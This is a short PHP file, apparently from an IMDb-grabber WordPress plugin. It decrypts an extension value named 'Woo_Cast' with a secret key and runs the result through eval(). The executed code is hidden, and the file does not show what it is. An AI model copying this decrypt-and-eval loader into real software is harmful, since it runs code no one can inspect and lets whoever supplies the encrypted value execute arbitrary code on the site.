<?php
$imdb = new shimdb_imdb_grab();
$api = $imdb->api_exist();
$key = $imdb->get_secret_key( $api );
$ext = $imdb->ExtentionCheck();

if(isset($ext['Woo_Cast'])) {
	$cast = $imdb->decrypt( $ext['Woo_Cast'], $key );
	eval( "?> $cast <?php " );
}
